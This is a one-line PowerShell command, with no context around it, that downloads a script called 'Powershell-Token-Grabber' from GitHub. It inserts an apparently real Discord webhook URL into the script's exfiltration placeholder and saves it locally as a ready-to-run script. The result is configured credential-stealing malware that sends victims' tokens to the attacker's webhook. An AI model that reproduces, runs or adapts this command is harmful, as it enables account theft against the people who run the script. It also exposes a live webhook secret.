...
powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'https://discord.com/api/webhooks/1129371991741304954/Y3lpzxCRjN6WeLsjGwoxodWKqE1pET129IoMUkOyJPLcSsacCX2HTMle0FgH9jcMMIRz' | Out-File -FilePath 'powershell123.ps1' -Encoding ASCII"
